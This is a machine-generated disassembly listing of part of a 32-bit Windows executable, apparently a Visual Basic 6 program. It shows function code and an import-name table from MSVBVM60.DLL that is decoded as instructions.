  409602:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  409605:	ff 15 60 11 40 00    	call   *0x401160
  40960b:	c3                   	ret
  40960c:	c3                   	ret
  40960d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409610:	8b 11                	mov    (%ecx),%edx
  409612:	8b 45 08             	mov    0x8(%ebp),%eax
  409615:	50                   	push   %eax
  409616:	ff 52 08             	call   *0x8(%edx)
  409619:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40961c:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40961f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  409626:	5f                   	pop    %edi
  409627:	5e                   	pop    %esi
  409628:	5b                   	pop    %ebx
  409629:	8b e5                	mov    %ebp,%esp
  40962b:	5d                   	pop    %ebp
  40962c:	c2 04 00             	ret    $0x4
  40962f:	cc                   	int3
  409630:	55                   	push   %ebp
  409631:	8b ec                	mov    %esp,%ebp
  409633:	83 ec 18             	sub    $0x18,%esp
  409636:	68 a6 14 40 00       	push   $0x4014a6
  40963b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  409641:	50                   	push   %eax
  409642:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  409649:	b8 84 00 00 00       	mov    $0x84,%eax
  40964e:	e8 4d 7e ff ff       	call   0x4014a0
  409653:	53                   	push   %ebx
  409654:	56                   	push   %esi
  409655:	57                   	push   %edi
  409656:	89 65 e8             	mov    %esp,-0x18(%ebp)
  409659:	c7 45 ec 28 14 40 00 	movl   $0x401428,-0x14(%ebp)
  409660:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  409667:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40966e:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  409675:	8b 45 0c             	mov    0xc(%ebp),%eax
  409678:	50                   	push   %eax
  409679:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40967c:	51                   	push   %ecx
  40967d:	ff 15 58 10 40 00    	call   *0x401058
  409683:	8b 55 10             	mov    0x10(%ebp),%edx
  409686:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  409689:	ff 15 00 11 40 00    	call   *0x401100
  40968f:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  409696:	6a ff                	push   $0xffffffff
  409698:	ff 15 4c 10 40 00    	call   *0x40104c
  40969e:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  4096a5:	c7 45 ac 01 00 00 00 	movl   $0x1,-0x54(%ebp)
  4096ac:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  4096b3:	6a 00                	push   $0x0
  4096b5:	8d 55 ac             	lea    -0x54(%ebp),%edx
  4096b8:	52                   	push   %edx
  4096b9:	8d 45 94             	lea    -0x6c(%ebp),%eax
  4096bc:	50                   	push   %eax
  4096bd:	e8 ee 91 ff ff       	call   0x4028b0
  4096c2:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  4096c8:	ff 15 34 10 40 00    	call   *0x401034
  4096ce:	8b 8d 78 ff ff ff    	mov    -0x88(%ebp),%ecx
  4096d4:	89 4d a8             	mov    %ecx,-0x58(%ebp)
  4096d7:	c7 45 fc 05 00 00 00 	movl   $0x5,-0x4(%ebp)
  4096de:	83 7d a8 00          	cmpl   $0x0,-0x58(%ebp)
  4096e2:	0f 85 aa 01 00 00    	jne    0x409892
  4096e8:	c7 45 fc 06 00 00 00 	movl   $0x6,-0x4(%ebp)
  4096ef:	6a 00                	push   $0x0
  4096f1:	6a 00                	push   $0x0
  4096f3:	8b 55 bc             	mov    -0x44(%ebp),%edx
  4096f6:	52                   	push   %edx
  4096f7:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  4096fd:	50                   	push   %eax
  4096fe:	ff 15 98 10 40 00    	call   *0x401098
  409704:	83 c4 10             	add    $0x10,%esp
  409707:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  40970a:	51                   	push   %ecx
  40970b:	6a 00                	push   $0x0
  40970d:	8d 95 7c ff ff ff    	lea    -0x84(%ebp),%edx
  409713:	52                   	push   %edx
  409714:	ff 15 18 11 40 00    	call   *0x401118
  40971a:	50                   	push   %eax
  40971b:	e8 30 92 ff ff       	call   0x402950
  409720:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  409726:	ff 15 34 10 40 00    	call   *0x401034
  40972c:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  409732:	89 45 a8             	mov    %eax,-0x58(%ebp)
  409735:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40973b:	ff 15 0c 10 40 00    	call   *0x40100c
  409741:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
  409748:	83 7d a8 00          	cmpl   $0x0,-0x58(%ebp)
  40974c:	0f 85 2a 01 00 00    	jne    0x40987c
  409752:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  409759:	68 78 36 40 00       	push   $0x403678
  40975e:	ff 15 d4 10 40 00    	call   *0x4010d4
  409764:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  40976a:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  40976d:	51                   	push   %ecx
  40976e:	8b 95 78 ff ff ff    	mov    -0x88(%ebp),%edx
  409774:	52                   	push   %edx
  409775:	e8 c2 92 ff ff       	call   0x402a3c
  40977a:	ff 15 34 10 40 00    	call   *0x401034
  409780:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%ebp)
  409787:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  40978e:	c7 45 fc 0a 00 00 00 	movl   $0xa,-0x4(%ebp)
  409795:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  409798:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
  40979e:	c7 45 fc 0b 00 00 00 	movl   $0xb,-0x4(%ebp)
  4097a5:	68 cc 36 40 00       	push   $0x4036cc
  4097aa:	ff 15 d4 10 40 00    	call   *0x4010d4
  4097b0:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  4097b6:	8b 8d 70 ff ff ff    	mov    -0x90(%ebp),%ecx
  4097bc:	51                   	push   %ecx
  4097bd:	8b 95 78 ff ff ff    	mov    -0x88(%ebp),%edx
  4097c3:	52                   	push   %edx
  4097c4:	e8 73 92 ff ff       	call   0x402a3c
  4097c9:	ff 15 34 10 40 00    	call   *0x401034
  4097cf:	c7 45 fc 0c 00 00 00 	movl   $0xc,-0x4(%ebp)
  4097d6:	8b 85 70 ff ff ff    	mov    -0x90(%ebp),%eax
  4097dc:	c7 40 10 01 00 00 00 	movl   $0x1,0x10(%eax)
  4097e3:	c7 45 fc 0d 00 00 00 	movl   $0xd,-0x4(%ebp)
  4097ea:	8b 8d 70 ff ff ff    	mov    -0x90(%ebp),%ecx
  4097f0:	c7 41 14 04 00 00 00 	movl   $0x4,0x14(%ecx)
  4097f7:	c7 45 fc 0e 00 00 00 	movl   $0xe,-0x4(%ebp)
  4097fe:	8d 55 14             	lea    0x14(%ebp),%edx
  409801:	52                   	push   %edx
  409802:	ff 15 d4 10 40 00    	call   *0x4010d4
  409808:	8b 8d 70 ff ff ff    	mov    -0x90(%ebp),%ecx
  40980e:	89 41 18             	mov    %eax,0x18(%ecx)
  409811:	c7 45 fc 0f 00 00 00 	movl   $0xf,-0x4(%ebp)
  409818:	c7 85 70 ff ff ff 00 	movl   $0x0,-0x90(%ebp)
  40981f:	00 00 00 
  409822:	c7 45 fc 10 00 00 00 	movl   $0x10,-0x4(%ebp)
  409829:	8b 55 90             	mov    -0x70(%ebp),%edx
  40982c:	52                   	push   %edx
  40982d:	ff 15 d4 10 40 00    	call   *0x4010d4
  409833:	89 85 74 ff ff ff    	mov    %eax,-0x8c(%ebp)
  409839:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40983c:	50                   	push   %eax
  40983d:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  409840:	51                   	push   %ecx
  409841:	8b 95 74 ff ff ff    	mov    -0x8c(%ebp),%edx
  409847:	52                   	push   %edx
  409848:	8b 45 8c             	mov    -0x74(%ebp),%eax
  40984b:	50                   	push   %eax
  40984c:	e8 97 91 ff ff       	call   0x4029e8
  409851:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  409857:	ff 15 34 10 40 00    	call   *0x401034
  40985d:	8b 8d 78 ff ff ff    	mov    -0x88(%ebp),%ecx
  409863:	89 4d a8             	mov    %ecx,-0x58(%ebp)
  409866:	c7 45 fc 11 00 00 00 	movl   $0x11,-0x4(%ebp)
  40986d:	8b 55 8c             	mov    -0x74(%ebp),%edx
  409870:	52                   	push   %edx
  409871:	e8 26 91 ff ff       	call   0x40299c
  409876:	ff 15 34 10 40 00    	call   *0x401034
  40987c:	c7 45 fc 13 00 00 00 	movl   $0x13,-0x4(%ebp)
  409883:	8b 45 94             	mov    -0x6c(%ebp),%eax
  409886:	50                   	push   %eax
  409887:	e8 6c 90 ff ff       	call   0x4028f8
  40988c:	ff 15 34 10 40 00    	call   *0x401034
  409892:	68 b9 98 40 00       	push   $0x4098b9
  409897:	eb 0d                	jmp    0x4098a6
  409899:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40989f:	ff 15 0c 10 40 00    	call   *0x40100c
  4098a5:	c3                   	ret
  4098a6:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4098a9:	ff 15 60 11 40 00    	call   *0x401160
  4098af:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  4098b2:	ff 15 64 11 40 00    	call   *0x401164
  4098b8:	c3                   	ret
  4098b9:	33 c0                	xor    %eax,%eax
  4098bb:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4098be:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4098c5:	5f                   	pop    %edi
  4098c6:	5e                   	pop    %esi
  4098c7:	5b                   	pop    %ebx
  4098c8:	8b e5                	mov    %ebp,%esp
  4098ca:	5d                   	pop    %ebp
  4098cb:	c2 10 00             	ret    $0x10
  4098ce:	cc                   	int3
  4098cf:	cc                   	int3
  4098d0:	9e                   	sahf
  4098d1:	9e                   	sahf
  4098d2:	9e                   	sahf
  4098d3:	9e                   	sahf
  4098d4:	fc                   	cld
  4098d5:	98                   	cwtl
  4098d6:	00 00                	add    %al,(%eax)
  4098d8:	ff                   	(bad)
  4098d9:	ff                   	(bad)
  4098da:	ff                   	(bad)
  4098db:	ff                   	(bad)
  4098dc:	ff                   	(bad)
  4098dd:	ff                   	(bad)
  4098de:	ff                   	(bad)
  4098df:	ff 6c 9a 00          	ljmp   *0x0(%edx,%ebx,4)
  4098e3:	00 00                	add    %al,(%eax)
  4098e5:	10 00                	adc    %al,(%eax)
	...
  4098fb:	00 7a 9a             	add    %bh,-0x66(%edx)
  4098fe:	00 00                	add    %al,(%eax)
  409900:	88 9a 00 00 92 9a    	mov    %bl,-0x656e0000(%edx)
  409906:	00 00                	add    %al,(%eax)
  409908:	a0 9a 00 00 b0       	mov    0xb000009a,%al
  40990d:	9a 00 00 c2 9a 00 00 	lcall  $0x0,$0x9ac20000
  409914:	d2 9a 00 00 e6 9a    	rcrb   %cl,-0x651a0000(%edx)
  40991a:	00 00                	add    %al,(%eax)
  40991c:	f6 9a 00 00 0a 9b    	negb   -0x64f60000(%edx)
  409922:	00 00                	add    %al,(%eax)
  409924:	18 9b 00 00 26 9b    	sbb    %bl,-0x64da0000(%ebx)
  40992a:	00 00                	add    %al,(%eax)
  40992c:	29 02                	sub    %eax,(%edx)
  40992e:	00 80 38 9b 00 00    	add    %al,0x9b38(%eax)
  409934:	4e                   	dec    %esi
  409935:	9b                   	fwait
  409936:	00 00                	add    %al,(%eax)
  409938:	66 9b                	data16 fwait
  40993a:	00 00                	add    %al,(%eax)
  40993c:	9a 02 00 80 76 9b 00 	lcall  $0x9b,$0x76800002
  409943:	00 86 9b 00 00 9a    	add    %al,-0x65ffff65(%esi)
  409949:	9b                   	fwait
  40994a:	00 00                	add    %al,(%eax)
  40994c:	aa                   	stos   %al,%es:(%edi)
  40994d:	9b                   	fwait
  40994e:	00 00                	add    %al,(%eax)
  409950:	b8 9b 00 00 ca       	mov    $0xca00009b,%eax
  409955:	9b                   	fwait
  409956:	00 00                	add    %al,(%eax)
  409958:	de 9b 00 00 56 02    	ficomps 0x2560000(%ebx)
  40995e:	00 80 08 02 00 80    	add    %al,-0x7ffffdf8(%eax)
  409964:	f0 9b                	lock fwait
  409966:	00 00                	add    %al,(%eax)
  409968:	78 02                	js     0x40996c
  40996a:	00 80 fa 9b 00 00    	add    %al,0x9bfa(%eax)
  409970:	0e                   	push   %cs
  409971:	02 00                	add    (%eax),%al
  409973:	80 08 9c             	orb    $0x9c,(%eax)
  409976:	00 00                	add    %al,(%eax)
  409978:	1a 9c 00 00 2e 9c 00 	sbb    0x9c2e00(%eax,%eax,1),%bl
  40997f:	00 3a                	add    %bh,(%edx)
  409981:	9c                   	pushf
  409982:	00 00                	add    %al,(%eax)
  409984:	11 02                	adc    %eax,(%edx)
  409986:	00 80 48 9c 00 00    	add    %al,0x9c48(%eax)
  40998c:	5a                   	pop    %edx
  40998d:	9c                   	pushf
  40998e:	00 00                	add    %al,(%eax)
  409990:	68 9c 00 00 80       	push   $0x8000009c
  409995:	9c                   	pushf
  409996:	00 00                	add    %al,(%eax)
  409998:	94                   	xchg   %eax,%esp
  409999:	9c                   	pushf
  40999a:	00 00                	add    %al,(%eax)
  40999c:	a2 9c 00 00 58       	mov    %al,0x5800009c
  4099a1:	02 00                	add    (%eax),%al
  4099a3:	80 b8 9c 00 00 c6 9c 	cmpb   $0x9c,-0x39ffff64(%eax)
  4099aa:	00 00                	add    %al,(%eax)
  4099ac:	d0 9c 00 00 ec 9c 00 	rcrb   $1,0x9cec00(%eax,%eax,1)
  4099b3:	00 02                	add    %al,(%edx)
  4099b5:	9d                   	popf
  4099b6:	00 00                	add    %al,(%eax)
  4099b8:	16                   	push   %ss
  4099b9:	9d                   	popf
  4099ba:	00 00                	add    %al,(%eax)
  4099bc:	24 9d                	and    $0x9d,%al
  4099be:	00 00                	add    %al,(%eax)
  4099c0:	60                   	pusha
  4099c1:	02 00                	add    (%eax),%al
  4099c3:	80 36 9d             	xorb   $0x9d,(%esi)
  4099c6:	00 00                	add    %al,(%eax)
  4099c8:	4a                   	dec    %edx
  4099c9:	9d                   	popf
  4099ca:	00 00                	add    %al,(%eax)
  4099cc:	5c                   	pop    %esp
  4099cd:	9d                   	popf
  4099ce:	00 00                	add    %al,(%eax)
  4099d0:	84 02                	test   %al,(%edx)
  4099d2:	00 80 85 02 00 80    	add    %al,-0x7ffffd7b(%eax)
  4099d8:	6a 9d                	push   $0xffffff9d
  4099da:	00 00                	add    %al,(%eax)
  4099dc:	74 9d                	je     0x40997b
  4099de:	00 00                	add    %al,(%eax)
  4099e0:	8a 9d 00 00 9a 9d    	mov    -0x62660000(%ebp),%bl
  4099e6:	00 00                	add    %al,(%eax)
  4099e8:	88 02                	mov    %al,(%edx)
  4099ea:	00 80 3a 02 00 80    	add    %al,-0x7ffffdc6(%eax)
  4099f0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4099f1:	9d                   	popf
  4099f2:	00 00                	add    %al,(%eax)
  4099f4:	b4 9d                	mov    $0x9d,%ah
  4099f6:	00 00                	add    %al,(%eax)
  4099f8:	c6                   	(bad)
  4099f9:	9d                   	popf
  4099fa:	00 00                	add    %al,(%eax)
  4099fc:	d8 9d 00 00 a9 02    	fcomps 0x2a90000(%ebp)
  409a02:	00 80 e8 9d 00 00    	add    %al,0x9de8(%eax)
  409a08:	fc                   	cld
  409a09:	9d                   	popf
  409a0a:	00 00                	add    %al,(%eax)
  409a0c:	0e                   	push   %cs
  409a0d:	9e                   	sahf
  409a0e:	00 00                	add    %al,(%eax)
  409a10:	64 00 00             	add    %al,%fs:(%eax)
  409a13:	80 1c 9e 00          	sbbb   $0x0,(%esi,%ebx,4)
  409a17:	00 62 02             	add    %ah,0x2(%edx)
  409a1a:	00 80 2a 9e 00 00    	add    %al,0x9e2a(%eax)
  409a20:	38 9e 00 00 64 02    	cmp    %bl,0x2640000(%esi)
  409a26:	00 80 4a 9e 00 00    	add    %al,0x9e4a(%eax)
  409a2c:	69 02 00 80 5a 9e    	imul   $0x9e5a8000,(%edx),%eax
  409a32:	00 00                	add    %al,(%eax)
  409a34:	64 9e                	fs sahf
  409a36:	00 00                	add    %al,(%eax)
  409a38:	74 9e                	je     0x4099d8
  409a3a:	00 00                	add    %al,(%eax)
  409a3c:	1e                   	push   %ds
  409a3d:	02 00                	add    (%eax),%al
  409a3f:	80 1f 02             	sbbb   $0x2,(%edi)
  409a42:	00 80 84 9e 00 00    	add    %al,0x9e84(%eax)
  409a48:	20 02                	and    %al,(%edx)
  409a4a:	00 80 21 02 00 80    	add    %al,-0x7ffffddf(%eax)
  409a50:	8e 9e 00 00 23 02    	mov    0x2230000(%esi),%ds
  409a56:	00 80 98 9e 00 00    	add    %al,0x9e98(%eax)
  409a5c:	a2 9e 00 00 b2       	mov    %al,0xb200009e
  409a61:	9e                   	sahf
  409a62:	00 00                	add    %al,(%eax)
  409a64:	45                   	inc    %ebp
  409a65:	02 00                	add    (%eax),%al
  409a67:	80 00 00             	addb   $0x0,(%eax)
  409a6a:	00 00                	add    %al,(%eax)
  409a6c:	4d                   	dec    %ebp
  409a6d:	53                   	push   %ebx
  409a6e:	56                   	push   %esi
  409a6f:	42                   	inc    %edx
  409a70:	56                   	push   %esi
  409a71:	4d                   	dec    %ebp
  409a72:	36 30 2e             	xor    %ch,%ss:(%esi)
  409a75:	44                   	inc    %esp
  409a76:	4c                   	dec    %esp
  409a77:	4c                   	dec    %esp
  409a78:	00 00                	add    %al,(%eax)
  409a7a:	00 00                	add    %al,(%eax)
  409a7c:	5f                   	pop    %edi
  409a7d:	5f                   	pop    %edi
  409a7e:	76 62                	jbe    0x409ae2
  409a80:	61                   	popa
  409a81:	53                   	push   %ebx
  409a82:	74 72                	je     0x409af6
  409a84:	49                   	dec    %ecx
  409a85:	32 00                	xor    (%eax),%al
  409a87:	00 00                	add    %al,(%eax)
  409a89:	00 5f 43             	add    %bl,0x43(%edi)
  409a8c:	49                   	dec    %ecx
  409a8d:	63 6f 73             	arpl   %ebp,0x73(%edi)
  409a90:	00 00                	add    %al,(%eax)
  409a92:	00 00                	add    %al,(%eax)
  409a94:	5f                   	pop    %edi
  409a95:	61                   	popa
  409a96:	64 6a 5f             	fs push $0x5f
  409a99:	66 70 74             	data16 jo 0x409b10
  409a9c:	61                   	popa
  409a9d:	6e                   	outsb  %ds:(%esi),(%dx)
  409a9e:	00 00                	add    %al,(%eax)
  409aa0:	00 00                	add    %al,(%eax)
  409aa2:	5f                   	pop    %edi
  409aa3:	5f                   	pop    %edi
  409aa4:	76 62                	jbe    0x409b08
  409aa6:	61                   	popa
  409aa7:	46                   	inc    %esi
  409aa8:	72 65                	jb     0x409b0f
  409aaa:	65 56                	gs push %esi
  409aac:	61                   	popa
  409aad:	72 00                	jb     0x409aaf
  409aaf:	00 00                	add    %al,(%eax)
  409ab1:	00 5f 5f             	add    %bl,0x5f(%edi)
  409ab4:	76 62                	jbe    0x409b18
  409ab6:	61                   	popa
  409ab7:	53                   	push   %ebx
  409ab8:	74 72                	je     0x409b2c
  409aba:	56                   	push   %esi
  409abb:	61                   	popa
  409abc:	72 4d                	jb     0x409b0b
  409abe:	6f                   	outsl  %ds:(%esi),(%dx)
  409abf:	76 65                	jbe    0x409b26
  409ac1:	00 00                	add    %al,(%eax)
  409ac3:	00 5f 5f             	add    %bl,0x5f(%edi)
  409ac6:	76 62                	jbe    0x409b2a
  409ac8:	61                   	popa
  409ac9:	4c                   	dec    %esp
  409aca:	65 6e                	outsb  %gs:(%esi),(%dx)
  409acc:	42                   	inc    %edx
  409acd:	73 74                	jae    0x409b43
  409acf:	72 00                	jb     0x409ad1
  409ad1:	00 00                	add    %al,(%eax)
  409ad3:	00 5f 5f             	add    %bl,0x5f(%edi)
  409ad6:	76 62                	jbe    0x409b3a
  409ad8:	61                   	popa
  409ad9:	46                   	inc    %esi
  409ada:	72 65                	jb     0x409b41
  409adc:	65 56                	gs push %esi
  409ade:	61                   	popa
  409adf:	72 4c                	jb     0x409b2d
  409ae1:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  409ae8:	5f                   	pop    %edi
  409ae9:	61                   	popa
  409aea:	64 6a 5f             	fs push $0x5f
  409aed:	66 64 69 76 5f 6d 36 	imul   $0x366d,%fs:0x5f(%esi),%si
  409af4:	34 00                	xor    $0x0,%al
  409af6:	00 00                	add    %al,(%eax)
  409af8:	5f                   	pop    %edi
  409af9:	5f                   	pop    %edi
  409afa:	76 62                	jbe    0x409b5e
  409afc:	61                   	popa
  409afd:	46                   	inc    %esi
  409afe:	72 65                	jb     0x409b65
  409b00:	65 4f                	gs dec %edi
  409b02:	62 6a 4c             	bound  %ebp,0x4c(%edx)
  409b05:	69 73 74 00 00 00 00 	imul   $0x0,0x74(%ebx),%esi
  409b0c:	5f                   	pop    %edi
  409b0d:	61                   	popa
  409b0e:	64 6a 5f             	fs push $0x5f
  409b11:	66 70 72             	data16 jo 0x409b86
  409b14:	65 6d                	gs insl (%dx),%es:(%edi)
  409b16:	31 00                	xor    %eax,(%eax)
  409b18:	00 00                	add    %al,(%eax)
  409b1a:	5f                   	pop    %edi
  409b1b:	5f                   	pop    %edi
  409b1c:	76 62                	jbe    0x409b80
  409b1e:	61                   	popa
  409b1f:	53                   	push   %ebx
  409b20:	74 72                	je     0x409b94
  409b22:	43                   	inc    %ebx
  409b23:	61                   	popa
  409b24:	74 00                	je     0x409b26
  409b26:	00 00                	add    %al,(%eax)
  409b28:	5f                   	pop    %edi
  409b29:	5f                   	pop    %edi
  409b2a:	76 62                	jbe    0x409b8e
  409b2c:	61                   	popa
  409b2d:	4c                   	dec    %esp
  409b2e:	73 65                	jae    0x409b95
  409b30:	74 46                	je     0x409b78
  409b32:	69 78 73 74 72 00 00 	imul   $0x7274,0x73(%eax),%edi
  409b39:	00 5f 5f             	add    %bl,0x5f(%edi)
  409b3c:	76 62                	jbe    0x409ba0
  409b3e:	61                   	popa
  409b3f:	53                   	push   %ebx
  409b40:	65 74 53             	gs je  0x409b96
  409b43:	79 73                	jns    0x409bb8
  409b45:	74 65                	je     0x409bac
  409b47:	6d                   	insl   (%dx),%es:(%edi)
  409b48:	45                   	inc    %ebp
  409b49:	72 72                	jb     0x409bbd
  409b4b:	6f                   	outsl  %ds:(%esi),(%dx)
  409b4c:	72 00                	jb     0x409b4e
  409b4e:	00 00                	add    %al,(%eax)
  409b50:	5f                   	pop    %edi
  409b51:	5f                   	pop    %edi
  409b52:	76 62                	jbe    0x409bb6
  409b54:	61                   	popa
  409b55:	48                   	dec    %eax
  409b56:	72 65                	jb     0x409bbd
  409b58:	73 75                	jae    0x409bcf
  409b5a:	6c                   	insb   (%dx),%es:(%edi)
  409b5b:	74 43                	je     0x409ba0
  409b5d:	68 65 63 6b 4f       	push   $0x4f6b6365
  409b62:	62 6a 00             	bound  %ebp,0x0(%edx)
  409b65:	00 00                	add    %al,(%eax)
  409b67:	00 5f 61             	add    %bl,0x61(%edi)
  409b6a:	64 6a 5f             	fs push $0x5f
  409b6d:	66 64 69 76 5f 6d 33 	imul   $0x336d,%fs:0x5f(%esi),%si
  409b74:	32 00                	xor    (%eax),%al
  409b76:	00 00                	add    %al,(%eax)
  409b78:	5f                   	pop    %edi
  409b79:	5f                   	pop    %edi
  409b7a:	76 62                	jbe    0x409bde
  409b7c:	61                   	popa
  409b7d:	45                   	inc    %ebp
  409b7e:	78 69                	js     0x409be9
  409b80:	74 50                	je     0x409bd2
  409b82:	72 6f                	jb     0x409bf3
  409b84:	63 00                	arpl   %eax,(%eax)
  409b86:	00 00                	add    %al,(%eax)
  409b88:	5f                   	pop    %edi
  409b89:	5f                   	pop    %edi
  409b8a:	76 62                	jbe    0x409bee
  409b8c:	61                   	popa
  409b8d:	46                   	inc    %esi
  409b8e:	69 6c 65 43 6c 6f 73 	imul   $0x65736f6c,0x43(%ebp,%eiz,2),%ebp
  409b95:	65 
  409b96:	41                   	inc    %ecx
  409b97:	6c                   	insb   (%dx),%es:(%edi)
  409b98:	6c                   	insb   (%dx),%es:(%edi)
  409b99:	00 00                	add    %al,(%eax)
  409b9b:	00 5f 5f             	add    %bl,0x5f(%edi)
  409b9e:	76 62                	jbe    0x409c02
  409ba0:	61                   	popa
  409ba1:	4f                   	dec    %edi
  409ba2:	6e                   	outsb  %ds:(%esi),(%dx)
  409ba3:	45                   	inc    %ebp
  409ba4:	72 72                	jb     0x409c18
  409ba6:	6f                   	outsl  %ds:(%esi),(%dx)
  409ba7:	72 00                	jb     0x409ba9
  409ba9:	00 00                	add    %al,(%eax)
  409bab:	00 5f 5f             	add    %bl,0x5f(%edi)
  409bae:	76 62                	jbe    0x409c12
  409bb0:	61                   	popa
  409bb1:	4f                   	dec    %edi
  409bb2:	62 6a 53             	bound  %ebp,0x53(%edx)
  409bb5:	65 74 00             	gs je  0x409bb8
  409bb8:	00 00                	add    %al,(%eax)
  409bba:	5f                   	pop    %edi
  409bbb:	61                   	popa
  409bbc:	64 6a 5f             	fs push $0x5f
  409bbf:	66 64 69 76 5f 6d 31 	imul   $0x316d,%fs:0x5f(%esi),%si
  409bc6:	36 69 00 00 00 00 5f 	imul   $0x5f000000,%ss:(%eax),%eax
  409bcd:	5f                   	pop    %edi
  409bce:	76 62                	jbe    0x409c32
  409bd0:	61                   	popa
  409bd1:	4f                   	dec    %edi
  409bd2:	62 6a 53             	bound  %ebp,0x53(%edx)
  409bd5:	65 74 41             	gs je  0x409c19
  409bd8:	64 64 72 65          	fs fs jb 0x409c41
  409bdc:	66 00 00             	data16 add %al,(%eax)
  409bdf:	00 5f 61             	add    %bl,0x61(%edi)
  409be2:	64 6a 5f             	fs push $0x5f
  409be5:	66 64 69 76 72 5f 6d 	imul   $0x6d5f,%fs:0x72(%esi),%si
  409bec:	31 36                	xor    %esi,(%esi)
  409bee:	69 00 00 00 5f 43    	imul   $0x435f0000,(%eax),%eax
  409bf4:	49                   	dec    %ecx
  409bf5:	73 69                	jae    0x409c60
  409bf7:	6e                   	outsb  %ds:(%esi),(%dx)
  409bf8:	00 00                	add    %al,(%eax)
  409bfa:	00 00                	add    %al,(%eax)
  409bfc:	5f                   	pop    %edi
  409bfd:	5f                   	pop    %edi
  409bfe:	76 62                	jbe    0x409c62
  409c00:	61                   	popa
  409c01:	43                   	inc    %ebx
  409c02:	68 6b 73 74 6b       	push   $0x6b74736b
  409c07:	00 00                	add    %al,(%eax)
  409c09:	00 5f 5f             	add    %bl,0x5f(%edi)
  409c0c:	76 62                	jbe    0x409c70
  409c0e:	61                   	popa
  409c0f:	46                   	inc    %esi
  409c10:	69 6c 65 43 6c 6f 73 	imul   $0x65736f6c,0x43(%ebp,%eiz,2),%ebp
  409c17:	65 
  409c18:	00 00                	add    %al,(%eax)
  409c1a:	00 00                	add    %al,(%eax)
  409c1c:	45                   	inc    %ebp
  409c1d:	56                   	push   %esi
  409c1e:	45                   	inc    %ebp
  409c1f:	4e                   	dec    %esi
  409c20:	54                   	push   %esp
  409c21:	5f                   	pop    %edi
  409c22:	53                   	push   %ebx
  409c23:	49                   	dec    %ecx
  409c24:	4e                   	dec    %esi
  409c25:	4b                   	dec    %ebx
  409c26:	5f                   	pop    %edi
  409c27:	41                   	inc    %ecx
  409c28:	64 64 52             	fs fs push %edx
  409c2b:	65 66 00 00          	data16 add %al,%gs:(%eax)
  409c2f:	00 5f 5f             	add    %bl,0x5f(%edi)
  409c32:	76 62                	jbe    0x409c96
  409c34:	61                   	popa
  409c35:	47                   	inc    %edi
  409c36:	65 74 33             	gs je  0x409c6c
  409c39:	00 00                	add    %al,(%eax)
  409c3b:	00 5f 5f             	add    %bl,0x5f(%edi)
  409c3e:	76 62                	jbe    0x409ca2
  409c40:	61                   	popa
  409c41:	53                   	push   %ebx
  409c42:	74 72                	je     0x409cb6
  409c44:	43                   	inc    %ebx
  409c45:	6d                   	insl   (%dx),%es:(%edi)
  409c46:	70 00                	jo     0x409c48
  409c48:	00 00                	add    %al,(%eax)
  409c4a:	44                   	inc    %esp
  409c4b:	6c                   	insb   (%dx),%es:(%edi)
  409c4c:	6c                   	insb   (%dx),%es:(%edi)
  409c4d:	46                   	inc    %esi
  409c4e:	75 6e                	jne    0x409cbe
  409c50:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  409c54:	6e                   	outsb  %ds:(%esi),(%dx)
  409c55:	43                   	inc    %ebx
  409c56:	61                   	popa
  409c57:	6c                   	insb   (%dx),%es:(%edi)
  409c58:	6c                   	insb   (%dx),%es:(%edi)
  409c59:	00 00                	add    %al,(%eax)
  409c5b:	00 5f 61             	add    %bl,0x61(%edi)
  409c5e:	64 6a 5f             	fs push $0x5f
  409c61:	66 70 61             	data16 jo 0x409cc5
  409c64:	74 61                	je     0x409cc7
  409c66:	6e                   	outsb  %ds:(%esi),(%dx)
  409c67:	00 00                	add    %al,(%eax)
  409c69:	00 5f 5f             	add    %bl,0x5f(%edi)
  409c6c:	76 62                	jbe    0x409cd0
  409c6e:	61                   	popa
  409c6f:	46                   	inc    %esi
  409c70:	69 78 73 74 72 43 6f 	imul   $0x6f437274,0x73(%eax),%edi
  409c77:	6e                   	outsb  %ds:(%esi),(%dx)
  409c78:	73 74                	jae    0x409cee
  409c7a:	72 75                	jb     0x409cf1
